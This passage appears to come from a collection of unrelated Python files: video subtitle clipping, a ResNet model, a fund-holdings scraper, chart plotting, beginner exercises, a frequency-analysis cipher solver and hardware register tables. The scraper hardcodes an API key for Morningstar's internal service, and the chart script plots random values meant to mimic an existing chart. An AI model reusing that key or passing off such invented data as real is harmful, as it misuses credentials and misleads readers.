round(subtitle[\"words\"][0][\"start\"], 2),\n                    round(subtitle[\"words\"][-1][\"end\"], 2),\n                ),\n                subtitle[\"text\"],\n            ]\n        )\n    else:\n        current_index = 0\n        for index in temp:\n            subtitle_list.append(\n                [\n                    (\n                        round(subtitle[\"words\"][current_index][\"start\"], 2),\n                        round(subtitle[\"words\"][index][\"end\"], 2),\n                    ),\n                    \" \".join(word_list[current_index : index + 1]).lstrip(),\n                ]\n            )\n            current_index = index + 1\n        if current_index >= len(word_list):\n            continue\n        subtitle_list.append(\n            [\n                (\n                    round(subtitle[\"words\"][current_index][\"start\"], 2),\n                    round(subtitle[\"words\"][-1][\"end\"], 2),\n                ),\n                \" \".join(word_list[current_index:]).lstrip(),\n            ]\n        )\n\nfor sub in subtitle_list:\n    sub[1] = sub[1].strip()\n\n# print(subtitle_list)\n\n# find segment with keyword\nsegment_with_keyword = []\n\nfor subtitle in transcribe_result[\"segments\"]:\n    for word in subtitle[\"words\"]:\n        if keyword.lower() in word[\"word\"].lower():\n            temp = {\"start\": word[\"start\"], \"end\": word[\"end\"], \"text\": word[\"word\"]}\n            segment_with_keyword.append(temp)\n\n# print(segment_with_keyword)\n\n# generate subtitle on the original video\ngenerator = lambda txt: TextClip(txt, font=\"Arial\", fontsize=32, color=\"white\")\n\nsubtitles = SubtitlesClip(subtitle_list, generator)\n\nvideo = VideoFileClip(input_video_file)\n\nresult_video = CompositeVideoClip(\n    [video, subtitles.set_position((\"center\", video.size[1] - 100))]\n)\n\n# generate video with segment with keyword\nclips = []\n\nfor counting, segment in enumerate(segment_with_keyword):\n    start_time = segment[\"start\"]\n    end_time = segment[\"end\"]\n\n    # adjust start and end time to make sure each clip is not too short\n    if end_time - start_time < 1:\n        diff = 1 - (end_time - start_time)\n        start_time -= diff / 2\n        end_time += diff / 2\n\n    clip = result_video.subclip(start_time, end_time)\n\n    # add counter to the video (right top corner)\n    txt_clip = TextClip(str(counting + 1), font=\"Arial\", fontsize=32, color=\"white\")\n    txt_clip = txt_clip.set_position((video.size[0] - 100, 50)).set_duration(\n        clip.duration\n    )\n    clip = CompositeVideoClip([clip, txt_clip])\n\n    clips.append(clip)\n\nfinal_video = concatenate_videoclips(clips)\n\nfinal_video.write_videofile(\n    f\"{input_video_file}_segments.mp4\",\n    fps=result_video.fps,\n    temp_audiofile=\"temp-audio.m4a\",\n    remove_temp=True,\n    codec=\"libx264\",\n    audio_codec=\"aac\",\n)\n",
    "import torch\nimport torch.nn as nn\nfrom torch.hub import load_state_dict_from_url\n\n\n__all__ = ['ResNet', 'resnet18', 'resnet34', 'resnet50', 'resnet101',\n           'resnet152', 'resnext50_32x4d', 'resnext101_32x8d',\n           'wide_resnet50_2', 'wide_resnet101_2']\n\n\nmodel_urls = {\n    'resnet18': 'https://download.pytorch.org/models/resnet18-5c106cde.pth',\n    'resnet34': 'https://download.pytorch.org/models/resnet34-333f7ec4.pth',\n    'resnet50': 'https://download.pytorch.org/models/resnet50-19c8e357.pth',\n    'resnet101': 'https://download.pytorch.org/models/resnet101-5d3b4d8f.pth',\n    'resnet152': 'https://download.pytorch.org/models/resnet152-b121ed2d.pth',\n    'resnext50_32x4d': 'https://download.pytorch.org/models/resnext50_32x4d-7cdf4587.pth',\n    'resnext101_32x8d': 'https://download.pytorch.org/models/resnext101_32x8d-8ba56ff5.pth',\n    'wide_resnet50_2': 'https://download.pytorch.org/models/wide_resnet50_2-95faca4d.pth',\n    'wide_resnet101_2': 'https://download.pytorch.org/models/wide_resnet101_2-32ee1156.pth',\n}\n\n\ndef conv3x3(in_planes, out_planes, stride=1, groups=1, dilation=1):\n    \"\"\"3x3 convolution with padding\"\"\"\n    return nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\n                     padding=dilation, groups=groups, bias=False, dilation=dilation)\n\n\ndef conv1x1(in_planes, out_planes, stride=1):\n    \"\"\"1x1 convolution\"\"\"\n    return nn.Conv2d(in_planes, out_planes, kernel_size=1, stride=stride, bias=False)\n\n\nclass BasicBlock(nn.Module):\n    expansion = 1\n\n    def __init__(self, inplanes, planes, stride=1, downsample=None, groups=1,\n                 base_width=64, dilation=1, norm_layer=None):\n        super(BasicBlock, self).__init__()\n        if norm_layer is None:\n            norm_layer = nn.BatchNorm2d\n        if groups != 1 or base_width != 64:\n            raise ValueError('BasicBlock only supports groups=1 and base_width=64')\n        if dilation > 1:\n            raise NotImplementedError(\"Dilation > 1 not supported in BasicBlock\")\n        # Both self.conv1 and self.downsample layers downsample the input when stride != 1\n        self.conv1 = conv3x3(inplanes, planes, stride)\n        self.bn1 = norm_layer(planes)\n        self.relu = nn.ReLU(inplace=True)\n        self.conv2 = conv3x3(planes, planes)\n        self.bn2 = norm_layer(planes)\n        self.downsample = downsample\n        self.stride = stride\n\n    def forward(self, x):\n        identity = x\n\n        out = self.conv1(x)\n        out = self.bn1(out)\n        out = self.relu(out)\n\n        out = self.conv2(out)\n        out = self.bn2(out)\n\n        if self.downsample is not None:\n            identity = self.downsample(x)\n\n        out += identity\n        out = self.relu(out)\n\n        return out\n\n\nclass Bottleneck(nn.Module):\n    # Bottleneck in torchvision places the stride for downsampling at 3x3 convolution(self.conv2)\n    # while original implementation places the stride at the first 1x1 convolution(self.conv1)\n    # according to \"Deep residual learning for image recognition\"https://arxiv.org/abs/1512.03385.\n    # This variant is also known as ResNet V1.5 and improves accuracy according to\n    # https://ngc.nvidia.com/catalog/model-scripts/nvidia:resnet_50_v1_5_for_pytorch.\n\n    expansion = 4\n\n    def __init__(self, inplanes, planes, stride=1, downsample=None, groups=1,\n                 base_width=64, dilation=1, norm_layer=None):\n        super(Bottleneck, self).__init__()\n        if norm_layer is None:\n            norm_layer = nn.BatchNorm2d\n        width = int(planes * (base_width / 64.)) * groups\n        # Both self.conv2 and self.downsample layers downsample the input when stride != 1\n        self.conv1 = conv1x1(inplanes, width)\n        self.bn1 = norm_layer(width)\n        self.conv2 = conv3x3(width, width, stride, groups, dilation)\n        self.bn2 = norm_layer(width)\n        self.conv3 = conv1x1(width, planes * self.expansion)\n        self.bn3 = norm_layer(planes * self.expansion)\n        self.relu = nn.ReLU(inplace=True)\n        self.downsample = downsample\n        self.stride = stride\n\n    def forward(self, x):\n        identity = x\n\n        out = self.conv1(x)\n        out = self.bn1(out)\n        out = self.relu(out)\n\n        out = self.conv2(out)\n        out = self.bn2(out)\n        out = self.relu(out)\n\n        out = self.conv3(out)\n        out = self.bn3(out)\n\n        if self.downsample is not None:\n            identity = self.downsample(x)\n\n        out += identity\n        out = self.relu(out)\n\n        return out\n\n\nclass ResNet(nn.Module):\n\n    def __init__(self, block, layers, num_classes=1000, zero_init_residual=False,\n                 groups=1, width_per_group=64, replace_stride_with_dilation=None,\n                 norm_layer=None, feature_size=64):\n        super(ResNet, self).__init__()\n        if norm_layer is None:\n            norm_layer = nn.BatchNorm2d\n        self._norm_layer = norm_layer\n\n        self.inplanes = feature_size\n        self.dilation = 1\n        if replace_stride_with_dilation is ",
    "##################################################################################################################################################################\nimport requests\nimport pandas as pd\nimport os\n\n#get current working directory\nprint(os.getcwd())\n\n# https://www.morningstarfunds.ie/ie/screener/fund.aspx#?filtersSelectedValue=%7B%7D\n# Format of link is : 'https://api-global.morningstar.com/sal-service/v1/fund/portfolio/holding/v2/(insert code of fund here)/data'\n\nlist1 = [(\"Fundsmith Equity R Acc EUR\",\"F00000O9HI\"),(\"Amundi Pioneer US Equity Fundamental Growth A USD\",\"F000013QY7\"),(\"Pictet Premium Brands HP SGD\",\"F00000MSZX\"),\n                (\"Pictet Security P USD\",\"F0000000KZ\"),(\"Robeco Global Consumer Trends Equities D USD\",\"F00000Q1YC\"),(\"BlackRock BGF World Energy A2 Hedged SGD\",\"F000002GK3\"),\n                (\"BlackRock GF Latin American A2 Hedged SGD\",\"F00000LYEB\"), (\"BlackRock GF World Gold A2 Hedged SGD\",\"F000002GJV\"),(\"BlackRock GF World Technology A2 USD\",\"F0GBR04AMX\"),\n                (\"BlackRock Global Allocation A2 Hedged SGD\",\"F000000IK9\"),(\"BlackRock World Mining A2 Hedged SGD\",\"F000000RN7\"),(\"Franklin Technology A Acc USD\", \"F0GBR04V77\"),\n                (\"JPM Brazil Equity A Acc NAV SGD\",\"F00000JNYY\"), (\"JPM Greater China A Acc NAV USD\",\"F0GBR05VWV\"),(\"JPM India A Acc NAV USD\",\"F0GBR05VW6\")]\nnew_list=[]\nfor (name,code) in list1:\n    \n    link = 'https://api-global.morningstar.com/sal-service/v1/fund/portfolio/holding/v2/' + code + '/data' \n    # example link = 'https://api-global.morningstar.com/sal-service/v1/fund/portfolio/holding/v2/F00000MSZX/data'  \n\n    headers = {\n        'apikey': 'lstzFDEOhfFNMLikKa0am9mgEKLBl49T',\n        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'\n    }\n\n    payload = {\n        'premiumNum': '100',\n        'freeNum': '25',\n        'languageId': 'en',\n        'locale': 'en',\n        'clientId': 'MDC',\n        'benchmarkId': 'mstarorcat',\n        'component': 'sal-components-mip-holdings',\n        'version': '3.59.1'\n    }\n\n    with requests.Session() as s:\n        s.headers.update(headers)\n        resp = s.get(link,params=payload)\n        container = resp.json()\n   \n    # extract all the corresponding values for each category into a list \n    morningstar = container['equityHoldingPage']['holdingList']\n    securityName = [x[\"securityName\"] for x in morningstar]\n    Weightage = [x[\"weighting\"] for x in morningstar]\n    numberOfShare = [x[\"numberOfShare\"] for x in morningstar]\n    firstboughtdate = [x['firstBoughtDate'] for x in morningstar]\n    country = [x['country'] for x in morningstar]\n    economicMoat = [x['economicMoat'] for x in morningstar]\n    sector = [x['sector'] for x in morningstar]\n    sectorcode = [x['sectorCode'] for x in morningstar]\n    # label each row with the fund it is derived from, for the first column\n    fund = [name]*len(securityName)\n    # create the list of features associated with the security, is the \n    y = list(zip(fund, securityName, Weightage, numberOfShare, firstboughtdate, country, economicMoat, sector, sectorcode))\n    # for printing each fund securities\n    new_list += y\n\n# put the list into columns\ndf = pd.DataFrame(new_list)\ndf.columns = ['fund','securityName', 'Weightage', 'numberOfShare', 'firstboughtdate','country','economicMoat','sector','sectorcode']\n\nwriter = pd.ExcelWriter('test.xlsx', engine='xlsxwriter')\ndf.to_excel(writer, sheet_name='Funds', index=False)\n# dynamically adjust all the column lengths\nfor column in df:\n    column_length = max(df[column].astype(str).map(len).max(), len(column))\n    col_idx = df.columns.get_loc(column)\n    writer.sheets['Funds'].set_column(col_idx, col_idx, column_length)\n# save the excel file\nwriter.save()\n\n\nprint(df)\n\n# This will be the example data extracted\n\n    # ###################################################################################################################################################################\n\n    # [{'securityName': 'Alphabet Inc Class C', 'secId': '0P00012BBI', 'performanceId': '0P00012BBI', 'holdingTypeId': 'E', 'weighting': 7.99928, 'numberOfShare': 1506718.0, 'marketValue': 190673716.0, 'shareChange': 0.0, 'country': 'United States', 'ticker': 'GOOG', 'totalReturn1Year': 40.5824, 'forwardPERatio': 20.202, 'stockRating': '4', 'economicMoat': 'Wide  ', 'sector': 'Communication Services', 'sectorCode': 'communicationsServices', 'holdingTrend': {'trend': [173251357.0, 166003771.0, 181904887.0, 190673716.0]}, 'holdingType': 'Equity', 'isin': 'US02079K1079', 'cusip': '02079K107', 'secondarySectorId': None, 'superSectorName': None, 'primarySectorName': None, 'secondarySectorName': None, 'firstBoughtDate': '2015-10-31T05:00:00.000', 'maturityDate': None, 'coupon': None, 'currency': 'USD', 'localCurrencyCode': 'USD', 'prospectusNetExpenseRatio': None, 'oneYearReturn': None, 'morningstarRating': None, 'ePUsedForOverallRating': 0, 'analystRating': None, 'me",
    "import matplotlib.pyplot as plt\nimport numpy as np\n\n# Define the years and the smooth decline in accuracy to mimic the provided chart\nyears = np.arange(1985, 2016)\naccuracy_smooth = np.linspace(0.35, 0.2, len(years))\n\n# Sort node_count in ascending order for visual similarity to the provided chart\nnode_count_sorted = np.sort(np.random.uniform(10000, 60000, len(years)))\n\n# Create figure and axis objects with the adjusted font sizes\nfig, ax1 = plt.subplots()\n\n# Plot the accuracy with a thicker and brighter red line\nax1.plot(years, accuracy_smooth, 'o-', color='firebrick', linewidth=2)\nax1.set_xlabel('Year', fontsize=20)\nax1.set_ylabel('Accuracy', color='firebrick', fontsize=20)\nax1.tick_params(axis='y', labelcolor='firebrick', labelsize=18)\nax1.tick_params(axis='x', labelsize=18)\n\n# Remove the vertical gridlines and make horizontal gridlines darker\nax1.grid(True, linestyle='--', linewidth=0.5, color='gray', axis='y')\nax1.set_facecolor('white')\n\n# Instantiate a second axes that shares the same x-axis\nax2 = ax1.twinx()\n\n# Plot the node count\nax2.bar(years, node_count_sorted, alpha=0.6, color='tab:blue')\nax2.set_ylabel('#Node', color='tab:blue', fontsize=20)\nax2.tick_params(axis='y', labelcolor='tab:blue', labelsize=18)\n\n# Show every third year for clarity\nplt.xticks(years[::3])\n\n# Tight layout to adjust for the second y-axis\nfig.tight_layout()\n\nplt.show()\n",
    "# Scenario\n# You've surely seen a seven-segment display.\n# It's a device (sometimes electronic, sometimes mechanical) designed to present one decimal digit using a subset of seven segments. If you still don't know what it is, refer to the following Wikipedia article.\n# Your task is to write a program which is able to simulate the work of a seven-display device, although you're going to use single LEDs instead of segments.\n# Each digit is constructed from 13 LEDs (some lit, some dark, of course) - that's how we imagine it:       \n\n#   # ### ### # # ### ### ### ### ### ### \n#   #   #   # # # #   #     # # # # # # # \n#   # ### ### ### ### ###   # ### ### # # \n#   # #     #   #   # # #   # # #   # # # \n#   # ### ###   # ### ###   # ### ### ###\n\n# Note: the number 8 shows all the LED lights on.\n# Your code has to display any non-negative integer number entered by the user.\n# Tip: using a list containing patterns of all ten digits may be very helpful.\n\n######################################################################################################################\n\n# Test data\n# Sample input:\n\n# 123\n\n# Sample output:\n\n#   # ### ### \n#   #   #   # \n#   # ### ### \n#   # #     # \n#   # ### ### \n\n# Sample input:\n\n# 9081726354\n\n# Sample output:\n\n# ### ### ###   # ### ### ### ### ### # # \n# # # # # # #   #   #   # #     # #   # # \n# ### # # ###   #   # ### ### ### ### ### \n#   # # # # #   #   # #   # #   #   #   # \n# ### ### ###   #   # ### ### ### ###   # \n######################################################################################################################\n\narr0=[\"###\",\"# #\",\"# #\",\"# #\",\"###\"]\narr1=[\"  #\",\"  #\",\"  #\",\"  #\",\"  #\"]\narr2=[\"###\",\"  #\",\"###\",\"#  \",\"###\"]\narr3=[\"###\",\"  #\",\"###\",\"  #\",\"###\"]\narr4=[\"# #\",\"# #\",\"###\",\"  #\",\"  #\"]\narr5=[\"###\",\"#  \",\"###\",\"  #\",\"###\"]\narr6=[\"###\",\"#  \",\"###\",\"# #\",\"###\"]\narr7=[\"###\",\"  #\",\"  #\",\"  #\",\"  #\"]\narr8=[\"###\",\"# #\",\"###\",\"# #\",\"###\"]\narr9=[\"###\",\"# #\",\"###\",\"  #\",\"  #\"]\ndic={\"0\":arr0,\"1\":arr1,\"2\":arr2,\"3\":arr3,\"4\":arr4,\"5\":arr5,\"6\":arr6,\"7\":arr7,\"8\":arr8,\"9\":arr9}\ndef ledfun(nmbr,dit):\n    if not nmbr.isdigit():\n        return \"El n\u00famero que ha ingresado no es v\u00e1lido\"\n    \n    str=\"\"\n    for i in range(5):\n        for c in nmbr:\n            str+=dit[c][i] + \" \"\n        str+=\"\\n\"\n    return str\n\nprint(ledfun(\"9081726354\",dic))",
    "#!/usr/bin/python3\n#@author: Github.com/syedalizain033  \nfrom pypdf import PdfReader #download via pip3 install pypdf\n\ndef prob_finder(dist,total):\n    dist_percentage = {char: round((count / total) * 100) for char, count in dist.items()}\n    dist_percentage=dict(sorted(dist_percentage.items(), key=lambda x: x[1], reverse=True))\n    return dist_percentage\n    # counter=0\n    # # for i,j in dist_percentage.items():\n    # #     counter+=j\n    # # print(counter)\n\ndef dist_gen(text):\n    dist={}\n    for i in text:\n        if i in dist:\n            dist[i]=dist[i]+1\n        else:\n            dist[i]=1\n    return dist\n\ndef wordcounter(pdf,text=\"\"):\n    content=PdfReader(pdf)\n    for i in range(len(content.pages)):\n        data=content.pages[i]\n        text=text+data.extract_text()\n    text=text.lower().replace(\" \",\"\").replace(\"\\n\",\"\").replace(\"'\",\"\").replace(\"'\",\"\").replace(\"/\",\"\").replace(\"-\",\"\").replace(\",\",\"\").replace(\"!\",\"\").replace(\".\",\"\").replace(\"`\",\"\").replace(\"\u2019\",\"\").replace(\"\u2018\",\"\").replace(\":\",\"\")\n    # print(text)\n    dist=dist_gen(text)\n    # print(dist)\n    return prob_finder(dist,len(text))\n    \n\ndef crack(dist, cipher):\n    decrypted_text = ''\n    enc_dist=prob_finder(dist_gen(cipher),len(cipher))\n    enc_dist=dict(sorted(enc_dist.items(), key=lambda x: x[1], reverse=True))\n\n    c=0\n    x=[x for x,y in enc_dist.items()]\n    i=[i for i,y in dist.items()]\n    print(cipher)\n    for j in range(len(x)):\n        try:\n            if x[c]==' ':\n                continue\n            cipher=cipher.replace(x[c],i[c])\n            print(cipher)\n            c+=1\n        except: break\n        \n    print(cipher)\n\ndef main():\n    pdf=\"file.pdf\"\n    dist=wordcounter(pdf)\n    # print(dist)\n    cipher=\"ybklypdyg byy\"\n    crack(dist,cipher)\n\nmain()",
    "import requests, uuid, json\ndef microsoftDictionaryLookup(word,from_,to, key):\n    # Add your key and endpoint\n    endpoint = \"https://api.cognitive.microsofttranslator.com\"\n\n    # location, also known as region.\n    # required if you're using a multi-service or regional (not global) resource. It can be found in the Azure portal on the Keys and Endpoint page.\n    location = \"westeurope\"\n\n    #path = '/translate?api-version=3.0'\n    path = '/dictionary/lookup?api-version=3.0'\n    constructed_url = endpoint + path + \"&includeAlignment=true\"\n\n    params = {\n        'from': from_,\n        'to': to\n    }\n\n    headers = {\n    'Ocp-Apim-Subscription-Key': key,\n    # location required if you're using a multi-service or regional (not global) resource.\n    'Ocp-Apim-Subscription-Region': location,\n    'Content-type': 'application/json',\n    'X-ClientTraceId': str(uuid.uuid4()),\n\n    }\n\n    body = [{\n        'Text': word\n    }]\n\n    request = requests.post(constructed_url, params=params, headers=headers, json=body)\n    response = request.json()\n    return response[0][\"translations\"]\n\ndef getMultipleTranslations(word,from_,to,key):\n    translations = microsoftDictionaryLookup(word,from_,to,key)\n    #print(translations)\n    translations = [trans[\"displayTarget\"] for trans in translations]\n    return translations",
    "from lib.infer_pack.modules.F0Predictor.F0Predictor import F0Predictor\r\nimport pyworld\r\nimport numpy as np\r\n\r\n\r\nclass HarvestF0Predictor(F0Predictor):\r\n    def __init__(self, hop_length=512, f0_min=50, f0_max=1100, sampling_rate=44100):\r\n        self.hop_length = hop_length\r\n        self.f0_min = f0_min\r\n        self.f0_max = f0_max\r\n        self.sampling_rate = sampling_rate\r\n\r\n    def interpolate_f0(self, f0):\r\n        \"\"\"\r\n        \u5bf9F0\u8fdb\u884c\u63d2\u503c\u5904\u7406\r\n        \"\"\"\r\n\r\n        data = np.reshape(f0, (f0.size, 1))\r\n\r\n        vuv_vector = np.zeros((data.size, 1), dtype=np.float32)\r\n        vuv_vector[data > 0.0] = 1.0\r\n        vuv_vector[data <= 0.0] = 0.0\r\n\r\n        ip_data = data\r\n\r\n        frame_number = data.size\r\n        last_value = 0.0\r\n        for i in range(frame_number):\r\n            if data[i] <= 0.0:\r\n                j = i + 1\r\n                for j in range(i + 1, frame_number):\r\n                    if data[j] > 0.0:\r\n                        break\r\n                if j < frame_number - 1:\r\n                    if last_value > 0.0:\r\n                        step = (data[j] - data[i - 1]) / float(j - i)\r\n                        for k in range(i, j):\r\n                            ip_data[k] = data[i - 1] + step * (k - i + 1)\r\n                    else:\r\n                        for k in range(i, j):\r\n                            ip_data[k] = data[j]\r\n                else:\r\n                    for k in range(i, frame_number):\r\n                        ip_data[k] = last_value\r\n            else:\r\n                ip_data[i] = data[i]  # \u8fd9\u91cc\u53ef\u80fd\u5b58\u5728\u4e00\u4e2a\u6ca1\u6709\u5fc5\u8981\u7684\u62f7\u8d1d\r\n                last_value = data[i]\r\n\r\n        return ip_data[:, 0], vuv_vector[:, 0]\r\n\r\n    def resize_f0(self, x, target_len):\r\n        source = np.array(x)\r\n        source[source < 0.001] = np.nan\r\n        target = np.interp(\r\n            np.arange(0, len(source) * target_len, len(source)) / target_len,\r\n            np.arange(0, len(source)),\r\n            source,\r\n        )\r\n        res = np.nan_to_num(target)\r\n        return res\r\n\r\n    def compute_f0(self, wav, p_len=None):\r\n        if p_len is None:\r\n            p_len = wav.shape[0] // self.hop_length\r\n        f0, t = pyworld.harvest(\r\n            wav.astype(np.double),\r\n            fs=self.hop_length,\r\n            f0_ceil=self.f0_max,\r\n            f0_floor=self.f0_min,\r\n            frame_period=1000 * self.hop_length / self.sampling_rate,\r\n        )\r\n        f0 = pyworld.stonemask(wav.astype(np.double), f0, t, self.fs)\r\n        return self.interpolate_f0(self.resize_f0(f0, p_len))[0]\r\n\r\n    def compute_f0_uv(self, wav, p_len=None):\r\n        if p_len is None:\r\n            p_len = wav.shape[0] // self.hop_length\r\n        f0, t = pyworld.harvest(\r\n            wav.astype(np.double),\r\n            fs=self.sampling_rate,\r\n            f0_floor=self.f0_min,\r\n            f0_ceil=self.f0_max,\r\n            frame_period=1000 * self.hop_length / self.sampling_rate,\r\n        )\r\n        f0 = pyworld.stonemask(wav.astype(np.double), f0, t, self.sampling_rate)\r\n        return self.interpolate_f0(self.resize_f0(f0, p_len))\r\n",
    "#Education part\n\n#print (123%10)\n#======================\n#a = 15 // (16 % 7)\n#b = 34 % a * 5 - 29 % 5 * 2\n#print(a + b)\n#======================\n\n#a = 82 // 3 ** 2 % 7\n#print(a)\n\n#Practice:\n\n#1 Geometric progression:\n\n#bn = b^1 * q^(n-1)\n\n#b1 = int(input())\n#q = int(input())\n#n = int(input())\n\n#progression = b1 * q**(n-1)\n\n#print (progression)\n\n#2 Distance in meters:\n\n#Input data format\n#The input to the program is a natural number - the number of centimeters.\n#Output data format\n#The program should output one number - the total number of meters.\n\n#Sample Input 1:\n#345\n#Sample Output 1:\n#3\n\n#cm = int(input())\n\n#print (cm//100)\n\n#3 Mandarins:\n\n#n pupils are divided k tangerines equally, the undivided remainder remains in the basket. How many whole tangerines will each student get? How many whole tangerines will remain in the basket?\n\n#Input data format\n#The program receives two integers as input: the number of schoolchildren and the number of tangerines, each on a separate line.\n\n#Output data format\n#The program should output two numbers: the number of tangerines that each student will get and the number of tangerines that will remain in the basket, each on a separate line.\n\n#pupils = int(input())\n#tangerines = int(input())\n\n# print (tangerines // pupils)\n# print (tangerines % pupils)\n\n# 4 Avengers is back\n\n# The mad titan Thanos has collected all 6 infinity stones and intends to wipe out half the population of the universe at the snap of his fingers. \n# If the population of the universe is an odd number, the titan will show mercy and round up the number of survivors. Help the Avengers count the number of survivors.\n\n# population = int(input())\n# survivors = (population // 2) + population % 2\n# print (survivors)\n\n# 5 train compartments\n\n# The compartment train has \n# 9 compartments with four seats for passengers in each compartment. \n# Write a program that determines the number of the compartment where the seat with the given number is located (the numbering of seats is through, starting from 1).\n\n# number_of_seat = int(input())\n# number_of_seat = number_of_seat * -1\n# print (number_of_seat // 4 * -1)\n\n#6 Time interval recalculation\n\n# Write a program to convert the value of a time interval given \n# in minutes to a value expressed in hours and minutes.\n\n# time_in_minutes = int(input())\n# print (time_in_minutes, '\u043c\u0438\u043d - \u044d\u0442\u043e', time_in_minutes//60, '\u0447\u0430\u0441', time_in_minutes%60, '\u043c\u0438\u043d\u0443\u0442.')\n\n#7 Three-digit number\n\n#test\n# digit = int(input())\n# digit1 = digit // 100\n# digit2 = digit // 10 % 10\n# digit3 = digit % 10\n# print ('First digit:', digit1, '\\n', 'Second digit:', digit2, '\\n', 'Third digit:', digit3)\n\n#Answer:\n# digit = int(input())\n# digit1 = digit // 100\n# digit2 = digit // 10 % 10\n# digit3 = digit % 10\n# print ('\u0421\u0443\u043c\u043c\u0430 \u0446\u0438\u0444\u0440 =', digit1 + digit2 + digit3)\n# print ('\u041f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u0446\u0438\u0444\u0440 =', digit1 * digit2 * digit3)\n\n#8 Digit transposition\n\n# Given a three-digit number \n# - abc in which all digits are different. \n# Write a program that outputs six numbers formed by permutation of digits of a given number.\n\n# abc = abc,acb,bac,bca,cab,cba.\n\n# abc = int(input()) #123\n# a = abc // 100 # 1\n# b = abc // 10 % 10 #2\n# c = abc % 10 #3\n\n# print (abc)\n# print (a * 100 + c * 10 + b)\n# print (b * 100 + a * 10 + c)\n# print (b * 100 + c * 10 + a)\n# print (c * 100 + a * 10 + b)\n# print (c * 100 + b * 10 + a)\n\n#9 A four-digit number\n# Write a program to find the digits of a four-digit number.\n\n# num = int(input())\n\n# if (num < 1000 or num >= 10000):\n#     print (\"NUM should be over 1000 or under 10000\")\n    \n# num1 = num // 1000\n# num2 = num // 100 % 10\n# num3 = num // 10 % 10\n# num4 = num % 10\n\n# print ('\u0426\u0438\u0444\u0440\u0430 \u0432 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u0442\u044b\u0441\u044f\u0447 \u0440\u0430\u0432\u043d\u0430', num1)\n# print ('\u0426\u0438\u0444\u0440\u0430 \u0432 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u0441\u043e\u0442\u0435\u043d \u0440\u0430\u0432\u043d\u0430', num2)\n# print ('\u0426\u0438\u0444\u0440\u0430 \u0432 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u0434\u0435\u0441\u044f\u0442\u043a\u043e\u0432 \u0440\u0430\u0432\u043d\u0430', num3)\n# print ('\u0426\u0438\u0444\u0440\u0430 \u0432 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u0435\u0434\u0438\u043d\u0438\u0446 \u0440\u0430\u0432\u043d\u0430', num4)\n\n#new_comit_comments?\n",
    "##\n## This file is part of the libsigrokdecode project.\n##\n## Copyright (C) 2019-2020 Benjamin Vernoux <bvernoux@gmail.com>\n##\n## This program is free software; you can redistribute it and/or modify\n## it under the terms of the GNU General Public License as published by\n## the Free Software Foundation; either version 2 of the License, or\n## (at your option) any later version.\n##\n## This program is distributed in the hope that it will be useful,\n## but WITHOUT ANY WARRANTY; without even the implied warranty of\n## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n## GNU General Public License for more details.\n##\n## You should have received a copy of the GNU General Public License\n## along with this program; if not, see <http://www.gnu.org/licenses/>.\n##\n## v0.1 - 17 September 2019 B.VERNOUX using ST25R3916 Datasheet DS12484 Rev 1 (January 2019)\n## v0.2 - 28 April 2020 B.VERNOUX using ST25R3916 Datasheet DS12484 Rev 2 (December 2019) https://www.st.com/resource/en/datasheet/st25r3916.pdf\n## v0.3 - 17 June 2020 B.VERNOUX using ST25R3916 Datasheet DS12484 Rev 3 (04 June 2020) https://www.st.com/resource/en/datasheet/st25r3916.pdf\n\n## ST25R3916 Datasheet DS12484 Rev 3 (04 June 2020) \u00a74.4 Direct commands\ndir_cmd = {\n#   addr: 'name'\n# Set Default\n    0xC0: 'SET_DEFAULT',\n    0xC1: 'SET_DEFAULT',\n# Stop All Activities\n    0xC2: 'STOP',\n    0xC3: 'STOP',\n# Transmit With CRC\n    0xC4: 'TXCRC',\n# Transmit Without CRC\n    0xC5: 'TXNOCRC',\n# Transmit REQA\n    0xC6: 'TXREQA',\n# Transmit WUPA\n    0xC7: 'TXWUPA',\n# NFC Initial Field ON\n    0xC8: 'NFCINITFON',\n# NFC Response Field ON\n    0xC9: 'NFCRESFON',\n# Go to Sense (Idle)\n    0xCD: 'GOIDLE',\n# Go to Sleep (Halt)\n    0xCE: 'GOHALT',\n# Mask Receive Data / Stops receivers and RX decoders\n    0xD0: 'STOPRX',\n# Unmask Receive Data / Starts receivers and RX decoders\n    0xD1: 'STARRX',\n# Change AM Modulation state\n    0xD2: 'SETAMSTATE',\n# Measure Amplitude\n    0xD3: 'MAMP',\n# Reset RX Gain\n    0xD5: 'RSTRXGAIN',\n# Adjust Regulators\n    0xD6: 'ADJREG',\n# Calibrate Driver Timing\n    0xD8: 'CALDRVTIM',\n# Measure Phase\n    0xD9: 'MPHASE',\n# Clear RSSI\n    0xDA: 'CLRRSSI',\n# Clear FIFO\n    0xDB: 'CLRFIFO',\n# Enter Transparent Mode\n    0xDC: 'TRMODE',\n# Calibrate Capacitive Sensor\n    0xDD: 'CALCAPA',\n# Measure Capacitance\n    0xDE: 'MCAPA',\n# Measure Power Supply\n    0xDF: 'MPOWER',\n# Start General Purpose Timer\n    0xE0: 'STARGPTIM',\n# Start Wake-up Timer\n    0xE1: 'STARWTIM',\n# Start Mask-receive Timer\n    0xE2: 'STARMSKTIM',\n# Start No-response Timer\n    0xE3: 'STARNRESPTIM',\n# Start PPON2 Timer\n    0xE4: 'STARPPON2TIM',\n# Stop No-response Timer\n    0xE8: 'STOPNRESTIM',\n# RFU / Not Used\n    0xFA: 'RFU',\n# Register Space-B Access\n    0xFB: 'REGSPACEB',\n# Register Test access\n    0xFC: 'TESTACCESS'\n# Other codes => RFU / Not Used\n}\n\n## ST25R3916 Datasheet DS12484 Rev 2 (December 2019) \u00a74.5 Registers Table 17. List of registers - Space A\n## ST25R3916 Datasheet DS12484 Rev 2 (December 2019) \u00a74.3.3 Serial peripheral interface (SPI) Table 11. SPI operation modes\nregsSpaceA = {\n#   addr: 'name'\n# \u00a74.5 Registers Table 17. List of registers - Space A\n# IO configuration\n    0x00: 'IOCFG1',\n    0x01: 'IOCFG2',\n# Operation control and mode definition\n    0x02: 'OPCTRL',\n    0x03: 'MODEDEF',\n    0x04: 'BITRATE',\n# Protocol configuration\n    0x05: 'TYPEA',\n    0x06: 